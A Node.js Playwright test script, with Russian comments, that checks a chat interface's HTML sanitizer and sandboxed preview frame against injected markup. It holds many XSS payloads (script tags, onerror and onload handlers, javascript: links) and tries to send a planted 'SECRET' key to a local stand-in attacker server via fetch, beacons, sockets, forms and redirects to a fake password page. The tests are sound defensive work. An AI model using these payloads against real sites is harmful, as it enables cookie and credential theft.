// Эталоны, которые исполняет только настоящий браузер: санитайзер и песочница HTML на настоящем коде страницы (стенд снимков).
// Чужой сервер считает обращения; на странице лежит «ключ» в localStorage и cookie. node scripts/shots/sandbox.mjs [номер]; упал — выход 1.
import { readFileSync } from "node:fs";
import http from "node:http";
import { join } from "node:path";
import { checker } from "./kit.mjs";
import { launch, OUT, prepare } from "./stand.mjs";

const filter = process.argv[2] ?? "";
await prepare();
const page = http.createServer((q, s) => {
  if (q.url.startsWith("/bundle.js")) return s.end(readFileSync(join(OUT, "bundle.js")));
  s.setHeader("content-type", "text/html; charset=utf-8");
  s.end(readFileSync(join(OUT, "index.html")));
});
await new Promise((r) => page.listen(0, "127.0.0.1", r));
const HOME = `http://127.0.0.1:${page.address().port}`;

const hits = [];
const evil = http.createServer((q, s) => {
  hits.push(`${q.method} ${q.url} ref=${q.headers.referer ?? "-"}`);
  s.setHeader("access-control-allow-origin", "*");
  if (q.url.startsWith("/landing")) {
    s.setHeader("content-type", "text/html; charset=utf-8");
    return s.end('<!doctype html><h1 id="l">ЧУЖАЯ СТРАНИЦА</h1><input type="password" placeholder="пароль">');
  }
  s.end("");
});
await new Promise((r) => evil.listen(0, "127.0.0.1", r));
const E = `http://127.0.0.1:${evil.address().port}`;
const b = await launch();
const { check, bad } = checker();

/** Страница стенда на чате сессии: «ключ» на месте, сообщения рамки считаются, текст ответа приходит кадром настоящей ленты. */
async function open() {
  const ctx = await b.newContext({ viewport: { width: 1280, height: 900 } });
  const p = await ctx.newPage();
  const pops = [];
  ctx.on("page", (x) => pops.push(x.url()));
  let dialogs = 0;
  p.on("dialog", (d) => {
    dialogs++;
    void d.dismiss();
  });
  await p.goto(`${HOME}/?app=pult&kind=small#chat?callsign=${encodeURIComponent("tests@wsl")}`);
  await p.waitForSelector(".chat-inp");
  await p.evaluate(() => {
    localStorage.setItem("fleet-key", "SECRET");
    document.cookie = "c=SECRET";
    window.msgs = [];
    addEventListener("message", (e) => window.msgs.push(e.data));
  });
  let seq = 900;
  const say = async (text) => {
    const uuid = `s${seq}`;
    seq++;
    await p.evaluate(([from, n, id, t]) => window.relay.push({ type: "session.events", from, seq: n, events: [{ type: "assistant", uuid: id, message: { id, content: [{ type: "text", text: t }] } }] }), ["tests@wsl", seq, uuid, text]);
    await p.waitForTimeout(250);
    return p.locator(".chat-reply").last();
  };
  /** Документ в рамке: блок html настоящей ленты, «Просмотр». */
  const frame = async (doc) => {
    const reply = await say(`\`\`\`html\n${doc}\n\`\`\``);
    await reply.locator(".cb-b", { hasText: "Просмотр" }).click();
    return reply;
  };
  return { ctx, p, say, frame, pops, dialogs: () => dialogs, msgs: () => p.evaluate(() => window.msgs) };
}

async function test(number, name, run) {
  if (filter && !number.includes(filter)) return;
  hits.length = 0;
  const x = await open();
  const eq = (got, want, what) => {
    const a = JSON.stringify(got);
    const w = JSON.stringify(want);
    if (a !== w) throw new Error(`${what}: ${a}, ждали ${w}`);
  };
  try {
    await run(x, eq);
    check(`${number} · ${name}`, true);
  } catch (e) {
    check(`${number} · ${name}`, false, e.message.split("\n")[0].slice(0, 400));
  }
  await x.ctx.close();
}

// ───── разметка ─────
await test("6780", "скрипт из ответа не исполняется в настоящем браузере", async ({ p, say }, eq) => {
  const at = p.url();
  const reply = await say('<script>window.pwned=1</script><img src=x onerror="window.pwned=2"><svg onload="window.pwned=3"></svg><details open ontoggle="window.pwned=4">d</details><input autofocus onfocus="window.pwned=5"><a id="l" href="javascript:window.pwned=6">ссылка</a>');
  await reply.locator("a", { hasText: "ссылка" }).click({ force: true });
  await p.waitForTimeout(300);
  eq(await p.evaluate(() => window.pwned ?? null), null, "метка на window");
  eq(p.url(), at, "адрес страницы");
});

await test("6781", "SVG в data:image показан картинкой, его скрипт не работает", async ({ p, say }, eq) => {
  const reply = await say(`<img alt="s" src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='window.pwned=7'><image href='${E}/svg-in-img.png'/><script>window.pwned=8</script></svg>">`);
  eq(await reply.locator('img[alt="s"]').count(), 1, "картинка");
  await p.waitForTimeout(500);
  eq(await p.evaluate(() => window.pwned ?? null), null, "метка на window");
  eq(hits, [], "обращения к чужому серверу");
});

await test("6782", "картинка через picture: у source нет src, запрос без реферера", async ({ p, say }, eq) => {
  const reply = await say(`<picture><source srcset="javascript:window.pwned=1 1x" src="${E}/q.png"><img src="${E}/j.png" alt="j"></picture>\n\n<picture><source srcset="${E}/p.png 1x" src="${E}/q.png"><img src="${E}/a.png" alt="p"></picture>`);
  await p.waitForTimeout(500);
  eq(await reply.locator("source").evaluateAll((all) => all.map((x) => x.hasAttribute("src"))), [false, false], "src у source");
  eq(await p.evaluate(() => window.pwned ?? null), null, "метка на window");
  if (!hits.length || hits.some((h) => !h.endsWith("ref=-"))) throw new Error(`обращения: ${JSON.stringify(hits)}`);
});

await test("6783", "подгрузка и подмена страницы: элементов нет, чужой сервер молчит, адрес прежний", async ({ p, say }, eq) => {
  const at = p.url();
  const reply = await say(`<base href="${E}/base/"><meta http-equiv="refresh" content="0;url=${E}/refresh"><link rel="stylesheet" href="${E}/css"><object data="${E}/obj"></object><embed src="${E}/emb"><video src="${E}/v" poster="${E}/pv"></video><audio src="${E}/au"></audio><svg><use href="${E}/u"></use></svg><math></math><map name="m"><area href="${E}/ar"></map><template><img src="${E}/t"></template><title>т</title><dialog open>д</dialog><marquee>м</marquee>текст`);
  await p.waitForTimeout(1000);
  for (const tag of ["base", "meta", "link", "object", "embed", "video", "audio", "svg", "math", "map", "area", "template", "title", "dialog", "marquee"]) eq(await reply.locator(`.md ${tag}`).count(), 0, tag);
  eq(hits, [], "обращения к чужому серверу");
  eq(p.url(), at, "адрес страницы");
});

// ───── песочница ─────
await test("6784", "скрипт документа работает внутри рамки", async ({ p, frame }, eq) => {
  await frame('<p id="c">0</p><button id="b" onclick="c.textContent=+c.textContent+1">+</button>');
  const f = p.frameLocator(".html-frame iframe");
  await f.locator("#b").click();
  await f.locator("#b").click();
  eq(await f.locator("#c").textContent(), "2", "счётчик в рамке");
});

await test("6785", "документ не видит страницу: SecurityError, origin null, значения ключа нет", async ({ frame, msgs }, eq) => {
  await frame(`<script>const o={};for(const [k,f] of Object.entries({ls:()=>localStorage.getItem("fleet-key"),cookie:()=>document.cookie,idb:()=>indexedDB.open("x").readyState,caches:()=>caches.keys(),parentDoc:()=>parent.document.title,parentLs:()=>parent.localStorage.getItem("fleet-key"),topLoc:()=>top.location.href})){try{const v=f();o[k]=String(v)}catch(e){o[k]=e.name}}o.origin=self.origin;parent.postMessage({read:o},"*");</script>`);
  await new Promise((r) => setTimeout(r, 300));
  const read = (await msgs()).find((m) => m?.read)?.read;
  if (!read) throw new Error("документ не ответил");
  eq(read.origin, "null", "origin");
  for (const k of ["ls", "parentDoc", "parentLs", "topLoc"]) eq(read[k], "SecurityError", k);
  if (JSON.stringify(read).includes("SECRET")) throw new Error(`ключ виден: ${JSON.stringify(read)}`);
});

await test("6786", "загрузки документа закрыты: 15 видов, чужой сервер молчит", async ({ p, frame }, eq) => {
  await frame(`<link rel="stylesheet" href="${E}/link"><script src="${E}/script"></script><img src="${E}/img"><style>@font-face{font-family:x;src:url(${E}/font)}body{font-family:x;background:url(${E}/bg)}</style>t<iframe src="${E}/iframe"></iframe><object data="${E}/object"></object><embed src="${E}/embed"><video src="${E}/video" poster="${E}/poster" autoplay></video><script>try{fetch("${E}/fetch").catch(()=>{})}catch(e){}try{const x=new XMLHttpRequest();x.open("GET","${E}/xhr");x.send()}catch(e){}try{navigator.sendBeacon("${E}/beacon","x")}catch(e){}try{new EventSource("${E}/es")}catch(e){}try{new WebSocket("${E.replace("http", "ws")}/ws")}catch(e){}try{new Worker("${E}/worker")}catch(e){}</script>`);
  await p.waitForTimeout(1000);
  eq(hits, [], "обращения к чужому серверу");
});

await test("6787", "своё правило документа не ослабляет запрет", async ({ p, frame }, eq) => {
  await frame(`<meta http-equiv="Content-Security-Policy" content="default-src *; img-src *; script-src * 'unsafe-inline'"><base href="${E}/"><img src="${E}/i"><img src="rel"><script src="rel.js"></script><script>fetch("${E}/f").catch(()=>{})</script>`);
  await p.waitForTimeout(1000);
  eq(hits, [], "обращения к чужому серверу");
});

await test("6788", "верх страницы и окна закрыты", async ({ p, frame, pops, dialogs }, eq) => {
  const at = p.url();
  await frame(`<a id="a" href="${E}/top" target="_top">a</a><a id="b" href="${E}/blank" target="_blank">b</a><form id="f" action="${E}/form" method="post"><input name="d" value="1"></form><script>try{top.location="${E}/t"}catch(e){}try{parent.location.href="${E}/p"}catch(e){}try{window.open("${E}/o")}catch(e){}try{alert(1)}catch(e){}a.click();b.click();try{f.submit()}catch(e){}</script>`);
  await p.waitForTimeout(1000);
  eq(p.url(), at, "адрес страницы");
  eq(pops, [], "новые окна");
  eq(dialogs(), 0, "диалоги");
  eq(hits, [], "обращения к чужому серверу");
});

await test("6789", "документ не выходит из рамки", async ({ p, frame, msgs }, eq) => {
  const title = await p.title();
  const before = await p.locator("img").count();
  await frame(`</iframe></div><script>parent.postMessage({inside:self.origin},"*")</script><img src=x onerror="try{parent.document.title='x'}catch(e){}">`);
  await p.waitForTimeout(500);
  eq(await p.title(), title, "заголовок страницы");
  eq((await msgs()).find((m) => m?.inside)?.inside, "null", "скрипт исполнился в рамке");
  eq(await p.locator("img").count(), before, "вне рамки новых элементов");
});

await test("6790", "сообщение документа странице: кадров relay нет, экран прежний", async ({ p, frame }, eq) => {
  await frame('<script>parent.postMessage({type:"session.prompt",callsign:"tests@wsl",text:"x"},"*");parent.postMessage("pushes","*");</script>');
  const sent = () => p.evaluate(() => window.relay.got.filter((f) => f.type === "session.prompt").length);
  await p.waitForTimeout(500);
  eq(await sent(), 0, "кадры session.prompt");
  eq(await p.locator(".chat-inp").count(), 1, "экран");
});

for (const [number, how, doc] of [
  ["6791", "скриптом", `<script>location.href="${E}/landing?via=script"</script>`],
  ["6792", "meta refresh", `<meta http-equiv="refresh" content="0;url=${E}/landing?via=meta">t`],
  ["6793", "нажатием ссылки", `<a id="a" href="${E}/landing?via=click">войти</a><script>a.click()</script>`],
]) {
  await test(number, `документ ушёл на другую страницу ${how}: просмотр снят, причина словами, можно показать заново`, async ({ p, frame }, eq) => {
    const reply = await frame(doc);
    await p.waitForTimeout(1000);
    eq(await reply.locator("iframe").count(), 0, "рамка");
    if (!(await reply.textContent()).includes("Документ ушёл на другую страницу — просмотр снят")) throw new Error(`нет причины: ${await reply.textContent()}`);
    eq(p.frames().some((f) => f.url().includes("/landing")), false, "чужая страница в карточке");
    // документ снова уходит сам: рамка снимается через миг, поэтому её появление ловит наблюдатель
    const shown = reply.evaluate((el) => new Promise((res) => {
      new MutationObserver(() => el.querySelector("iframe") && res(true)).observe(el, { childList: true, subtree: true });
      setTimeout(() => res(false), 3000);
    }));
    await reply.locator("button", { hasText: "Показать снова" }).click();
    eq(await shown, true, "рамка снова");
  });
}

await test("6794", "документ не подделывает сигнал: уход до загрузки всё равно снимает рамку", async ({ p, frame }, eq) => {
  const reply = await frame(`<script>for(const s of document.scripts)parent.postMessage(s.textContent,"*");dispatchEvent(new Event("load"));location.href="${E}/landing?via=spoof"</script>`);
  await p.waitForTimeout(1200);
  eq(await reply.locator("iframe").count(), 0, "рамка");
});

await test("6797", "свой документ остаётся: сигнал пришёл, рамка живёт", async ({ p, frame }, eq) => {
  const reply = await frame("<h1>Отчёт</h1>");
  await p.waitForTimeout(1200);
  eq(await reply.locator("iframe").count(), 1, "рамка");
  eq(await p.frameLocator(".html-frame iframe").locator("h1").textContent(), "Отчёт", "документ");
  eq(await p.frameLocator(".html-frame iframe").locator("script").count(), 0, "сигнал убрал себя");
});

// ───── приглашение ─────
await test("6796", "ссылка-приглашение при имеющемся пропуске: экран подтверждения, пропуск прежний", async ({ p, ctx }, eq) => {
  const q = await ctx.newPage();
  const invite = `p3a1.${"A".repeat(43)}`;
  await q.goto(`${HOME}/?app=pult&kind=small#invite=${invite}`);
  await q.waitForSelector(".sb-big");
  eq(await q.locator(".sb-big").textContent(), "Заменить пропуск этого устройства?", "экран");
  eq(new URL(q.url()).hash, "", "адрес");
  await q.screenshot({ path: join(OUT, "replace-pass.png") });
  await q.locator("button", { hasText: "Оставить текущий" }).click();
  await q.waitForSelector(".chat-inp, .bd-list, .sb-main");
  eq(await q.locator(".sb-big").count(), 0, "экран снят");
  eq(p.url().includes("invite"), false, "первая вкладка");
});

await test("6795", "опасный HTML в образце галереи: на странице чисто, счётчик работает только в рамке", async ({ p }, eq) => {
  await p.evaluate(() => (location.hash = "#gallery"));
  await p.waitForSelector(".chat-gal");
  const row = p.locator('[data-sample="Встроенный HTML и блоки просмотра"]');
  const html = await row.innerHTML();
  for (const bad of ["<script", "onerror", "javascript:"]) if (html.includes(bad)) throw new Error(`на странице ${bad}`);
  eq(await row.locator("a", { hasText: "опасная ссылка без адреса" }).evaluate((a) => a.hasAttribute("href")), false, "href опасной ссылки");
  await row.locator(".cb").first().locator(".cb-b", { hasText: "Просмотр" }).click();
  const f = row.frameLocator("iframe").first();
  await f.locator("button").click();
  eq(await f.locator("#c").textContent(), "Нажатий: 1", "счётчик в рамке");
  eq(await p.evaluate(() => window.n ?? null), null, "счётчик на странице");
});

await b.close();
page.close();
evil.close();
console.log(bad() ? `\nупало ${bad()}` : "\nвсё прошло");
process.exit(bad() ? 1 : 0);
